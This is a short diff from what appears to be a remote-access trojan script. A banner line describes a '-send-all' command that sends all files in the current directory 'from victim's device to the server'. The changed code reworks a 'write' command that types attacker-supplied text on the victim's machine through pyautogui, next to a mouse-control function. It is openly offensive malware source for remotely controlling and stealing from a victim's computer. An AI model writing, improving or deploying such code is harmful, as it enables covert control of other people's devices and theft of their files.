@@ -63,8 +63,10 @@ banner = r"""
  -send-all: send all files for current directory from victim's device to the server.
 """
 def write_keyboards(command, delay=0.05):
-    if command.startswith('write"') and command.endswith('"'):
-        text = command[7:-1]
+    if command.lower().startswith("write "):
+        text = command[6:].strip()
+        if text.startswith('"') and text.endswith('"'):
+            text = text[1:-1]
         pyautogui.write(text, interval=delay)
 def move_mouse(command, duration=0.1):
     parts = command.split()
